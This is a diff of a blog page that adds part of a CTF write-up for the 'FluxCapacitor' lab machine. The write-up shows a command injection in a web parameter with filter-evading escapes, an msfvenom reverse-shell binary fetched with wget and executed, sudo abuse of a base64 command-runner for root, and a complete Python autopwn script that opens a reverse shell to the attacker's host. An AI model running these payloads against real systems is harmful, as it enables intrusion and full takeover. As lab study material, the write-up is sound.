+</span><span class="cp"></span><span class="k">if</span> <span class="o">[</span> -z <span class="s2">&#34;</span><span class="nv">$XDG_VTNR</span><span class="s2">&#34;</span> <span class="o">]</span><span class="p">;</span> <span class="k">then</span>
+  <span class="nb">exec</span> /usr/bin/X -listen tcp <span class="s2">&#34;</span><span class="nv">$@</span><span class="s2">&#34;</span>
+<span class="k">else</span>
+  <span class="nb">exec</span> /usr/bin/X -listen tcp <span class="s2">&#34;</span><span class="nv">$@</span><span class="s2">&#34;</span> vt<span class="nv">$XDG_VTNR</span>
+<span class="k">fi</span></code></pre></div></div></p>
+
+<p>Then all you have to do is to allow incoming connections from the specific IP:
+<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ xhost +10.10.10.69</code></pre></div></div></p>
+
+<p>Now let&rsquo;s connect:
+<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ curl &#34;http://10.10.10.69/sync?opt=&#39; /usr/bin/xter\m -display 10.10.15.203:0&#39;&#34;</code></pre></div></div>
+OR
+<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ curl &#34;http://10.10.10.69/sync?opt=&#39; DISPLAY=10.10.15.203:0 /usr/bin/xter\m&#39;&#34;</code></pre></div></div></p>
+
+<h2 id="getting-a-shell-by-uploading-a-linux-elf">Getting a shell by uploading a linux elf</h2>
+
+<p>We can get a reverse shell this way too:
+<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ msfvenom -p linux/x86/shell_reverse_tcp  LHOST=10.10.15.15 LPORT=80 -f elf &gt; /var/www/html/index.html
+$ curl &#34;http://10.10.10.69/sync?opt=&#39; w\get 10.10.15.15 -P /tmp&#39;
+$ curl &#34;http://10.10.10.69/sync?opt=&#39; c\hmod +x /tmp/index.html&#39;
+$ curl &#34;http://10.10.10.69/sync?opt=&#39; /tmp/index.html&#39;</code></pre></div></div></p>
+
+<p>Don&rsquo;t forget to listen:
+<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ sudo nc -lvp 80
+connect to [10.10.15.15 ] from (UNKNOWN) [10.10.15.15 ] 54678
+...</code></pre></div></div></p>
+
+<h2 id="privilege-escalation">Privilege escalation</h2>
+
+<p>Let&rsquo;s examine if we have sudo:
+<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ curl &#34;http://10.10.10.69/sync?opt=&#39; sudo -l&#39;&#34;
+
+Matching Defaults entries for nobody on fluxcapacitor:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User nobody may run the following commands on fluxcapacitor:
+    (ALL) ALL
+    (root) NOPASSWD: /home/themiddle/.monit</code></pre></div></div></p>
+
+<p>Nice! Let&rsquo;s check this .monit script:
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">root@fluxcapacitor:/home/themiddle# cat .monit
+
+<span class="cp">#!/bin/bash
+</span><span class="cp"></span>
+<span class="k">if</span> <span class="o">[</span> <span class="s2">&#34;</span><span class="nv">$1</span><span class="s2">&#34;</span> <span class="o">==</span> <span class="s2">&#34;cmd&#34;</span> <span class="o">]</span><span class="p">;</span> <span class="k">then</span>
+    <span class="nb">echo</span> <span class="s2">&#34;Trying to execute </span><span class="si">${</span><span class="nv">2</span><span class="si">}</span><span class="s2">&#34;</span>
+    <span class="nv">CMD</span><span class="o">=</span><span class="k">$(</span><span class="nb">echo</span> -n <span class="si">${</span><span class="nv">2</span><span class="si">}</span> <span class="p">|</span> base64 -d<span class="k">)</span>
+    bash -c <span class="s2">&#34;</span><span class="nv">$CMD</span><span class="s2">&#34;</span>
+<span class="k">fi</span></code></pre></div></p>
+
+<p>All it needs is a base64-encoded command argument:
+<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ $ echo -ne cat /root/root.txt | base64
+Y2F0IC9yb290L3Jvb3QudHh0
+
+$ curl -s &#34;http://fluxcapacitor.htb/sync?opt=&#39;\{ sudo /home/themiddle/.monit cmd Y2F0IC9yb290L3Jvb3QudHh0 \}&#39;&#34;
+Trying to execute Y2F0IC9yb290L3Jvb3QudHh0
+bdc89b40eda244649072189a8438b30e</code></pre></div></div></p>
+
+<h2 id="autopwn-script">Autopwn script</h2>
+
+<p>Here is my autopwn script:
+<div class="highlight"><pre class="chroma"><code class="language-python" data-lang="python"><span class="ch">#!/usr/bin/env python2</span>
+<span class="kn">import</span> <span class="nn">base64</span>
+<span class="kn">import</span> <span class="nn">signal</span><span class="o">,</span> <span class="nn">thread</span>
+<span class="kn">import</span> <span class="nn">requests</span><span class="o">,</span> <span class="nn">urllib</span>
+<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="n">signal</span><span class="o">.</span><span class="n">signal</span><span class="p">(</span><span class="n">signal</span><span class="o">.</span><span class="n">SIGINT</span><span class="p">,</span> <span class="n">signal</span><span class="o">.</span><span class="n">SIG_DFL</span><span class="p">)</span>
+
+<span class="n">LHOST</span><span class="o">=</span><span class="s2">&#34;10.10.14.43&#34;</span>
+<span class="n">LPORT</span><span class="o">=</span><span class="mi">60001</span>
+<span class="n">RHOST</span><span class="o">=</span><span class="s2">&#34;10.10.10.69&#34;</span>
+<span class="n">RPORT</span><span class="o">=</span><span class="mi">80</span>
+
+<span class="n">PAYLOAD</span> <span class="o">=</span> <span class="s2">&#34;/usr/bin/python3 -c </span><span class="se">\&#34;</span><span class="s2">import os,pty,socket;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#39;&#34;</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">LHOST</span><span class="p">)</span><span class="o">+</span><span class="s2">&#34;&#39;,&#34;</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">LPORT</span><span class="p">)</span><span class="o">+</span><span class="s2">&#34;));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);os.putenv(&#39;HISTFILE&#39;,&#39;/dev/null&#39;);pty.spawn([&#39;/bin/bash&#39;,&#39;-i&#39;]);s.close();exit();</span><span class="se">\&#34;</span><span class="s2">&#34;</span>
+
+<span class="k">class</span> <span class="nc">NoEncodingSession</span><span class="p">(</span><span class="n">requests</span><span class="o">.</span><span class="n">Session</span><span class="p">):</span>
+    <span class="k">def</span> <span class="nf">send</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">):</span>
+        <span class="c1"># a[0] is prepared request</span>
+        <span class="n">a</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">url</span> <span class="o">=</span> <span class="n">urllib</span><span class="o">.</span><span class="n">unquote</span><span class="p">(</span><span class="n">a</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">url</span><span class="p">)</span>
+        <span class="k">return</span> <span class="n">requests</span><span class="o">.</span><span class="n">Session</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">send_shell_payload</span><span class="p">():</span>
+    <span class="n">encoded_payload</span> <span class="o">=</span> <span class="s2">&#34;</span><span class="se">\\</span><span class="s2">&#34;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">PAYLOAD</span><span class="p">))</span>
+    <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&#34;http://&#34;</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">RHOST</span><span class="p">)</span><span class="o">+</span><span class="s2">&#34;:&#34;</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">RPORT</span><span class="p">)</span><span class="o">+</span><span class="s2">&#34;/sync?opt=&#39; sudo /home/themiddle/.monit cmd &#34;</span><span class="o">+</span><span class="n">encoded_payload</span><span class="o">+</span><span class="s2">&#34;&#39;&#34;</span><span class="p">)</span>
+    <span class="k">try</span><span class="p">:</span>
+        <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&#34;I am sending the encoded payload for you...&#34;</span><span class="p">)</span>
+        <span class="n">client</span> <span class="o">=</span> <span class="n">NoEncodingSession</span><span class="p">()</span>
+        <span class="n">client</span><span class="o">.</span><span class="n">keep_alive</span> <span class="o">=</span> <span class="bp">False</span>
+        <span class="n">url</span> <span class="o">=</span> <span class="s2">&#34;http://&#34;</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">RHOST</span><span class="p">)</span><span class="o">+</span><span class="s2">&#34;:&#34;</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">RPORT</span><span class="p">)</span><span class="o">+</span><span class="s2">&#34;/sync&#34;</span>
+        <span class="n">response</span> <span class="o">=</span> <span class="n">client</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">params</span><span class="o">=</span><span class="s2">&#34;opt=&#39; sudo /home/themiddle/.monit cmd &#34;</span><span class="o">+</span><span class="n">encoded_payload</span><span class="o">+</span><span class="s2">&#34;&#39;&#34;</span><span class="p">)</span>
+        <span class="k">print</span><span class="p">(</span><span class="s2">&#34;STATUS CODE: &#34;</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">response</span><span class="o">.</span><span class="n">status_code</span><span class="p">))</span>
+        <span class="k">print</span><span class="p">(</span><span class="n">response</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
+    <span class="k">except</span> <span class="n">requests</span><span class="o">.</span><span class="n">exceptions</span><span class="o">.</span><span class="n">RequestException</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+        <span class="n">log</span><span class="o">.</span><span class="n">failure</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">e</span><span class="p">))</span>
+    <span class="k">finally</span><span class="p">:</span>
+        <span class="k">if</span> <span class="n">client</span><span class="p">:</span>
+            <span class="n">client</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+
+<span class="k">try</span><span class="p">:</span>
+    <span class="n">threading</span><span class="o">.</span><span class="n">Thread</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="n">send_shell_payload</span><span class="p">)</span><span class="o">.</span><span class="n">start</span><span class="p">()</span>
+<span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+    <span class="n">log</span><span class="o">.</span><span class="n">error</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">e</span><span class="p">))</span>
+<span class="n">shell</span> <span class="o">=</span> <span class="n">listen</span><span class="p">(</span><span class="n">LPORT</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">10</span><span class="p">)</span><span class="o">.</span><span class="n">wait_for_connection</span><span class="p">()</span>
+<span class="k">if</span> <span class="n">shell</span><span class="o">.</span><span class="n">sock</span> <span class="ow">is</span> <span class="bp">None</span><span class="p">:</span>
+    <span class="n">log</span><span class="o">.</span><span class="n">failure</span><span class="p">(</span><span class="s2">&#34;Connection timeout.&#34;</span><span class="p">)</span>
+    <span class="n">sys</span><span class="o">.</span><span class="nb">exit</span><span class="p">()</span>
+<span class="n">shell</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+<span class="n">sys</span><span class="o">.</span><span class="nb">exit</span><span class="p">()</span></code></pre></div></p>
+
+<p>Let&rsquo;s run it:
+<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ python2 autopwn_flux.py 
+[*] http://10.10.10.69:80/sync?opt=&#39; sudo /home/themiddle/.monit cmd L\3\V\z\c\i\9\i\a\W\4\v\c\H\l\0\a\G\9\u\M\y\A\t\Y\y\A\i\a\W\1\w\b\3\J\0\I\G\9\z\L\H\B\0\e\S\x\z\b\2\N\r\Z\X\Q\7\c\z\1\z\b\2\N\r\Z\X\Q\u\c\2\9\j\a\2\V\0\K\H\N\v\Y\2\t\l\d\C\5\B\R\l\9\J\T\k\V\U\L\H\N\v\Y\2\t\l\d\C\5\T\T\0\N\L\X\1\N\U\U\k\V\B\T\S\k\7\c\y\5\j\b\2\5\u\Z\W\N\0\K\C\g\n\M\T\A\u\M\T\A\u\M\T\Q\u\N\D\M\n\L\D\Y\w\M\D\A\x\K\S\k\7\b\3\M\u\Z\H\V\w\M\i\h\z\L\m\Z\p\b\G\V\u\b\y\g\p\L\D\A\p\O\2\9\z\L\m\R\1\c\D\I\o\c\y\5\m\a\W\x\l\b\m\8\o\K\S\w\x\K\T\t\v\c\y\5\k\d\X\A\y\K\H\M\u\Z\m\l\s\Z\W\5\v\K\C\k\s\M\i\k\7\b\3\M\u\c\H\V\0\Z\W\5\2\K\C\d\I\S\V\N\U\R\k\l\M\R\S\c\s\J\y\9\k\Z\X\Y\v\b\n\V\s\b\C\c\p\O\3\B\0\e\S\5\z\c\G\F\3\b\i\h\b\J\y\9\i\a\W\4\v\Y\m\F\z\a\C\c\s\J\y\1\p\J\1\0\p\O\3\M\u\Y\2\x\v\c\2\U\o\K\T\t\l\e\G\l\0\K\C\k\7\I\g\=\=&#39;
+[+] Trying to bind to 0.0.0.0 on port 60001: Done
+[*] I am sending the encoded payload for you...
+[+] Waiting for connections on 0.0.0.0:60001: Got connection from 10.10.10.69 on port 49114
+[*] Switching to interactive mode
+root@fluxcapacitor:/# $ whoami
+root</code></pre></div></div></p>
+
+<p>As you see, I escape every single character in the base64-encoded command argument. I do this to avoid being blocked by some filtering rule that will match some random combination of letters. You can download the script here: <a href="https://github.com/Alamot/code-snippets/blob/master/hacking/HTB/FluxCapacitor/autopwn_flux.py" target="_blank">https://github.com/Alamot/code-snippets/blob/master/hacking/HTB/FluxCapacitor/autopwn_flux.py</a></p>
 
         </div>
 
         <aside>
           <div class="p-share centered">
-            <a href="http://www.facebook.com/sharer.php?src=bm&u=https%3a%2f%2falamot.github.io%2fmindcontrol_parasites%2f&t=Mind%20control%20parasites.%20How%20do%20they%20do%20it%3f" onclick="window.open(this.href, 'PCwindow', 'width=550, height=350, menubar=no, toolbar=no, scrollbars=yes'); return false;"><i class="fa fa-facebook"></i></a>
-            <a href="https://plus.google.com/share?url=https%3a%2f%2falamot.github.io%2fmindcontrol_parasites%2f" onclick="window.open(this.href, 'PCwindow', 'width=550, height=350, menubar=no, toolbar=no, scrollbars=yes'); return false;"><i class="fa fa-google-plus"></i></a>
-            <a lang="en" href="http://twitter.com/intent/tweet?url=https%3a%2f%2falamot.github.io%2fmindcontrol_parasites%2f&text=Mind%20control%20parasites.%20How%20do%20they%20do%20it%3f&tw_p=tweetbutton" onclick="window.open(this.href, 'PCwindow', 'width=550, height=350, menubar=no, toolbar=no, scrollbars=yes'); return false;"><i class="fa fa-twitter"></i></a>
-            <a lang="el" href="http://twitter.com/intent/tweet?url=https%3a%2f%2falamot.github.io%2fmindcontrol_parasites%2f&text=%ce%a0%ce%b1%cf%81%ce%ac%cf%83%ce%b9%cf%84%ce%b1%20%cf%80%ce%bf%cf%85%20%ce%b5%ce%bb%ce%ad%ce%b3%cf%87%ce%bf%cf%85%ce%bd%20%cf%84%ce%bf%20%ce%bc%cf%85%ce%b1%ce%bb%cf%8c.%20%ce%a0%cf%8e%cf%82%20%cf%84%ce%bf%20%ce%ba%ce%ac%ce%bd%ce%bf%cf%85%ce%bd%3b&tw_p=tweetbutton" onclick="window.open(this.href, 'PCwindow', 'width=550, height=350, menubar=no, toolbar=no, scrollbars=yes'); return false;"><i class="fa fa-twitter"></i></a>
-            <a lang="en" href="http://pinterest.com/pin/create/link/?url==https%3a%2f%2falamot.github.io%2fmindcontrol_parasites%2f&description=Mind%20control%20parasites.%20How%20do%20they%20do%20it%3f&media=https://alamot.github.io/images/brain_signals.jpg" onclick="window.open(this.href, 'PCwindow', 'width=550, height=350, menubar=no, toolbar=no, scrollbars=yes'); return false;"><i class="fa fa-pinterest-p"></i></a>
-            <a lang="el" href="http://pinterest.com/pin/create/link/?url==https%3a%2f%2falamot.github.io%2fmindcontrol_parasites%2f&description=%ce%a0%ce%b1%cf%81%ce%ac%cf%83%ce%b9%cf%84%ce%b1%20%cf%80%ce%bf%cf%85%20%ce%b5%ce%bb%ce%ad%ce%b3%cf%87%ce%bf%cf%85%ce%bd%20%cf%84%ce%bf%20%ce%bc%cf%85%ce%b1%ce%bb%cf%8c.%20%ce%a0%cf%8e%cf%82%20%cf%84%ce%bf%20%ce%ba%ce%ac%ce%bd%ce%bf%cf%85%ce%bd%3b&media=https://alamot.github.io/images/brain_signals.jpg" onclick="window.open(this.href, 'PCwindow', 'width=550, height=350, menubar=no, toolbar=no, scrollbars=yes'); return false;"><i class="fa fa-pinterest-p"></i></a>
+            <a href="http://www.facebook.com/sharer.php?src=bm&u=https%3a%2f%2falamot.github.io%2ffluxcapacitor_writeup%2f&t=FluxCapacitor%20write-up" onclick="window.open(this.href, 'PCwindow', 'width=550, height=350, menubar=no, toolbar=no, scrollbars=yes'); return false;"><i class="fa fa-facebook"></i></a>
+            <a href="https://plus.google.com/share?url=https%3a%2f%2falamot.github.io%2ffluxcapacitor_writeup%2f" onclick="window.open(this.href, 'PCwindow', 'width=550, height=350, menubar=no, toolbar=no, scrollbars=yes'); return false;"><i class="fa fa-google-plus"></i></a>
+            <a lang="en" href="http://twitter.com/intent/tweet?url=https%3a%2f%2falamot.github.io%2ffluxcapacitor_writeup%2f&text=FluxCapacitor%20write-up&tw_p=tweetbutton" onclick="window.open(this.href, 'PCwindow', 'width=550, height=350, menubar=no, toolbar=no, scrollbars=yes'); return false;"><i class="fa fa-twitter"></i></a>
+            <a lang="el" href="http://twitter.com/intent/tweet?url=https%3a%2f%2falamot.github.io%2ffluxcapacitor_writeup%2f&text=%ce%91%ce%bd%ce%ac%ce%bb%cf%85%cf%83%ce%b7%20%cf%84%ce%bf%cf%85%20FluxCapacitor&tw_p=tweetbutton" onclick="window.open(this.href, 'PCwindow', 'width=550, height=350, menubar=no, toolbar=no, scrollbars=yes'); return false;"><i class="fa fa-twitter"></i></a>
+            <a lang="en" href="http://pinterest.com/pin/create/link/?url==https%3a%2f%2falamot.github.io%2ffluxcapacitor_writeup%2f&description=FluxCapacitor%20write-up&media=https://alamot.github.io/images/capacitors.jpg" onclick="window.open(this.href, 'PCwindow', 'width=550, height=350, menubar=no, toolbar=no, scrollbars=yes'); return false;"><i class="fa fa-pinterest-p"></i></a>
+            <a lang="el" href="http://pinterest.com/pin/create/link/?url==https%3a%2f%2falamot.github.io%2ffluxcapacitor_writeup%2f&description=%ce%91%ce%bd%ce%ac%ce%bb%cf%85%cf%83%ce%b7%20%cf%84%ce%bf%cf%85%20FluxCapacitor&media=https://alamot.github.io/images/capacitors.jpg" onclick="window.open(this.href, 'PCwindow', 'width=550, height=350, menubar=no, toolbar=no, scrollbars=yes'); return false;"><i class="fa fa-pinterest-p"></i></a>
           </div>
         </aside>
       </article>
@@ -348,25 +674,21 @@ if (language) {
            
            
            
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/tally_writeup/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/dart.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Tally write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Tally</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">03 May 2018</time>
+      <time lang="el">03 Μαϊ 2018</time>
+    </footer>
+  </a>
+</article>
+
            
           
            
@@ -376,33 +698,21 @@ if (language) {
            
            
            
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/inception_writeup/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/mirror.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Inception write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Inception</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">14 Apr 2018</time>
+      <time lang="el">14 Απρ 2018</time>
+    </footer>
+  </a>
+</article>
+
            
           
            
@@ -416,45 +726,161 @@ if (language) {
            
            
            
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/minion_writeup/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/minions.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Minion write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Minion</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">10 Apr 2018</time>
+      <time lang="el">10 Απρ 2018</time>
+    </footer>
+  </a>
+</article>
+
            
           
            
            
            
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/sense_writeup/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/pfsense.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Sense write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Sense</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">24 Mar 2018</time>
+      <time lang="el">24 Μαρ 2018</time>
+    </footer>
+  </a>
+</article>
+
+           
           
            
            
            
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/enterprise_writeup/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/space.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Enterprise write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Enterprise</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">19 Mar 2018</time>
+      <time lang="el">19 Μαρ 2018</time>
+    </footer>
+  </a>
+</article>
+
+           
           
            
            
            
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/node_writeup/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/jscode.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Node write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Node</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">03 Mar 2018</time>
+      <time lang="el">03 Μαρ 2018</time>
+    </footer>
+  </a>
+</article>
+
+           
           
            
            
            
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/mantis_writeup/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/mantis.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Mantis write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Mantis</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">18 Feb 2018</time>
+      <time lang="el">18 Φεβ 2018</time>
+    </footer>
+  </a>
+</article>
+
+           
           
            
            
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/nineveh_writeup/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/nineveh.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Nineveh write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Nineveh</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">17 Dec 2017</time>
+      <time lang="el">17 Δεκ 2017</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/optimum_writeup/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/optimum.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Optimum write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Optimum</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">28 Oct 2017</time>
+      <time lang="el">28 Οκτ 2017</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/legacy_writeup/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/legacy.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Legacy write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Legacy</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">19 Oct 2017</time>
+      <time lang="el">19 Οκτ 2017</time>
+    </footer>
+  </a>
+</article>
+
            
           
            
@@ -493,20 +919,28 @@ if (language) {
            
            
             <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/entomopathogenic_fungi/" class="clearfix">
+  <a href="https://alamot.github.io/rold/" class="clearfix">
     <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/ep_fungi.jpg);"></div>
+      <div class="image" style="background-image: url(https://alamot.github.io/images/rold.jpg);"></div>
     </div>
     <footer>
-      <h3 class="title" lang="en">Entomopathogenic fungi (available in greek only)</h3>
-      <h3 class="title" lang="el">Εντομοπαθογόνοι μύκητες</h3>
+      <h3 class="title" lang="en">Retriever of Lost Dreams</h3>
+      <h3 class="title" lang="el">Ο Ιχνηλάτης των Χαμένων Ονείρων</h3>
       <i class="fa fa-calendar"></i>
-      <time lang="en">22 Nov 2010</time>
-      <time lang="el">22 Νοε 2010</time>
+      <time lang="en">16 Aug 2015</time>
+      <time lang="el">16 Αυγ 2015</time>
     </footer>
   </a>
 </article>
 
+           
+          
+           
+           
+           
+          
+           
+           
            
           
            
@@ -517,16 +951,16 @@ if (language) {
            
            
             <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/theories_of_intelligence/" class="clearfix">
+  <a href="https://alamot.github.io/matchsticks/" class="clearfix">
     <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/intelligence.jpg);"></div>
+      <div class="image" style="background-image: url(https://alamot.github.io/images/matchsticks.jpg);"></div>
     </div>
     <footer>
-      <h3 class="title" lang="en">Theories of intelligence (available in greek only)</h3>
-      <h3 class="title" lang="el">Θεωρίες νοημοσύνης</h3>
+      <h3 class="title" lang="en">Alamot&#39;s matchstick puzzles</h3>
+      <h3 class="title" lang="el">Σπιρτοσπαζοκεφαλιές</h3>
       <i class="fa fa-calendar"></i>
-      <time lang="en">01 Jun 2010</time>
-      <time lang="el">01 Ιουν 2010</time>
+      <time lang="en">11 Mar 2014</time>
+      <time lang="el">11 Μαρ 2014</time>
     </footer>
   </a>
 </article>
@@ -877,13 +1311,6 @@ if (language) {
            
            
           
-          
-           
-           
-           
-           
-          
-           
            
            
            
@@ -891,14 +1318,7 @@ if (language) {
            
            
            
-           
           
-           
-           
-           
-           
-          
-           
            
            
            
@@ -906,14 +1326,7 @@ if (language) {
            
            
            
-           
           
-           
-           
-           
-           
-          
-           
            
            
            
@@ -921,14 +1334,7 @@ if (language) {
            
            
            
-           
           
-           
-           
-           
-           
-          
-           
            
            
            
@@ -936,14 +1342,7 @@ if (language) {
            
            
            
-           
           
-           
-           
-           
-           
-          
-           
            
            
            
@@ -951,17 +1350,19 @@ if (language) {
            
            
            
+          
+           
+           
            
           
            
            
            
-           
           
            
            
            
-           
+          
           
            
            
@@ -988,77 +1389,16 @@ if (language) {
            
            
             <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/testakia_viologias/" class="clearfix">
+  <a href="https://alamot.github.io/mssql_shell/" class="clearfix">
     <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/testakia_viologias.jpg);"></div>
+      <div class="image" style="background-image: url(https://alamot.github.io/images/dbs.jpg);"></div>
     </div>
     <footer>
-      <h3 class="title" lang="en">Biology tests (available in greek only)</h3>
-      <h3 class="title" lang="el">Τεστάκια Βιολογίας</h3>
+      <h3 class="title" lang="en">MSSQL shell with file upload capability</h3>
+      <h3 class="title" lang="el">MSSQL κέλυφος με δυνατότητα ανεβάσματος αρχείων</h3>
       <i class="fa fa-calendar"></i>
-      <time lang="en">22 Aug 2015</time>
-      <time lang="el">22 Αυγ 2015</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/amylpred2/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/amylpred2.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">A consensus method for the prediction of aggregation-prone peptides in globular proteins</h3>
-      <h3 class="title" lang="el">Μια συναινετική μέθοδος πρόγνωσης πεπτιδίων που εμφανίζουν τάση προς συσσωμάτωση στις σφαιρικές πρωτεΐνες</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">10 Jan 2013</time>
-      <time lang="el">10 Ιαν 2013</time>
+      <time lang="en">13 Apr 2018</time>
